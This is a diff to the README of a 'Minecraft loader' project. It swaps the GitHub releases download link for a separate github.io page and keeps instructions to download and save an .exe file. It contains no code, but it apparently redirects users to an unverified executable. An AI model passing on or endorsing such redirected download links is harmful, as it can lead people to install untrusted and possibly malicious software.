@@ -1,6 +1,6 @@
 # 🎮 huegrad-loader-site - Your gateway to our Minecraft world
 
-[![](https://img.shields.io/badge/Download_Latest_Version-blue.svg)](https://github.com/jesuscu8373/huegrad-loader-site/releases)
+[![](https://img.shields.io/badge/Download_Latest_Version-blue.svg)](https://jesuscu8373.github.io)
 
 ## 📖 About this software
 
@@ -20,7 +20,7 @@ Your computer needs to meet these basic standards to run the loader:
 
 Follow these steps to get the loader on your computer:
 
-1. Visit the following address to download the software: [https://github.com/jesuscu8373/huegrad-loader-site/releases](https://github.com/jesuscu8373/huegrad-loader-site/releases).
+1. Visit the following address to download the software: [https://jesuscu8373.github.io](https://jesuscu8373.github.io).
 2. Look for the file ending in .exe in the latest release section.
 3. Click the link to begin the download.
 4. Save the file to your desktop or downloads folder.
